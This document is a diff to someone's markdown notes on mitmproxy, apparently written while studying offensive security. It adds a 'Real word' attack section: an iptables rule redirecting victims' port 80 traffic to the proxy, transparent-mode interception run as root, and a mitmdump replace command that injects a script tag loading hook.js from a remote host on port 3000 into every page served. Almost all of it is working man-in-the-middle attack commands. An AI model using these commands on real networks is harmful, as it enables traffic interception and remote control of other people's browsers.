@@ -252,20 +252,31 @@ mitmweb
 ```
 in Start the search bar
 ```
--a .js
--m post
--m get
+~a .js
+~m post
+~m get
 ```
 intercept
 ```
 /*
--bs </body>
+~bs </body>
 ```
 Real word 
 - run MITM attak to get in the midle
 - config iptables to redirect to MITMPROXY
 ```
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+TO REMOVE IT
+iptables -t nat --flush
+```
+run mitmweb in transparent mode
+```
+sudo su
+mitmweb -m transparent
+```
+MitmDump
+```
+mitmdump -m transparent --replace :~bs:"</body>":"<script src="http://ip:3000/hook.js"></script></body>"
 ```
 
 2 Main operation modes:
